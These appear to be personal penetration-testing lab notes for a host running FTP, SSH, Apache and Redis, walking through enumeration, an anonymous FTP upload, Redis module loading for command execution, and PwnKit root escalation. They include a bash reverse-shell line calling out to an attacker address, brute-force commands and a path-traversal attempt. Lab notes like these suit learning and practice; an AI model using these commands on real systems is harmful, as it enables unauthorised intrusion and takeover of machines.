### Enumeration
```
IP=192.168.218.93
sudo nmap -sU $IP
sudo nmap -p- -vv $IP
sudo nmap -p21,22,80,6379 -A $IP
```
### Ports
- Banner Grab: nc -nv $IP PORT
- 21
	- vsftpd 3.0.2
	- nc -nv $IP 21
		- vsftpd 3.0.2
- 22
	- OpenSSH 7.4 (protocol 2.0)
	- nc -nv $IP 22
		- SSH-2.0-OpenSSH_7.4
- 80
	- Apache httpd 2.4.6 ((CentOS) PHP/7.3.22)
	- nc -nv $IP 80
		- http
- 6379
	- Redis key-value store 5.0.9
	- nc -nv $IP 6379
		- redis
### Foothold
- 21
	- ftp anonymous@$IP
		- successful
		- /pub
		- passive is on
		- passive off
			- 200 EPRT command successful. Consider using EPSV.
		- cd pub
			- upload module.so
	- `hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://$IP
- 6379
	- ./redis-rogue-server.py --rhost $IP --lhost 192.168.45.195
		- no work
	- Execute commands: https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
	- nc -nv $IP 6379
		- info
			- writes out command
		- After module.so was put on ftp server
		- MODULE LOAD /var/ftp/pub/module.so
		- system.exec "id"
			- ![[Pasted image 20240717155849.png]]
			- `/bin/bash -i >& /dev/tcp/192.168.45.195/21 0>&1` to get rce
- 80
	- Default landing page
		- ![[Pasted image 20240717153020.png]]
		- Search
			- ![[Pasted image 20240717153039.png]]
			- Puts it in url
			- Tried `../../../../../../../etc/passwd`
				- http://192.168.218.93/etc/passwd
	- Versions
		- HTMLy v2.7.5
			- From source code
	- Directory Brute force
		- dirsearch -u http://$IP
		- ffuf -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -u http://$IP/FUZZ
		- Found directories
			- /login
				- ![[Pasted image 20240717153239.png]]
				- Search takes you to same search feature
				- admin:admin
					- username not found in our record
			- /composer.json
				- ![[Pasted image 20240717153508.png]]
			- /humans.txt
				- ![[Pasted image 20240717153619.png]]
	- Vulnerability scan
		- nikto -h http://$IP
			- /robots.txt
				- ![[Pasted image 20240717153212.png]]
			- Apache/2.4.6 (CentOS) PHP/7.3.22
### PE
#### Linux
- pablo
	- id
		- uid=1000(pablo) gid=1000(pablo) groups=1000(pablo)
	- sudo -l
		- needs password
	- uname -a
		- Linux sybaris 3.10.0-1127.19.1.el7.x86_64 #1 SMP Tue Aug 25 17:23:54 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
		- ./PwnKit
			- rooted
	- getcap -r / 2>/dev/null
		- nothing
	- suid
		- find / -type f -perm -04000 -ls 2>/dev/null
			- nothing
	- Users with console
		- pablo
	- netstat -ano
		- Active ports
			- 6379
			- 55192
			- 323
			- 25
	- linpeas
		- Possible Exploits
		- Interesting Files
### Credentials
### Lessons Learned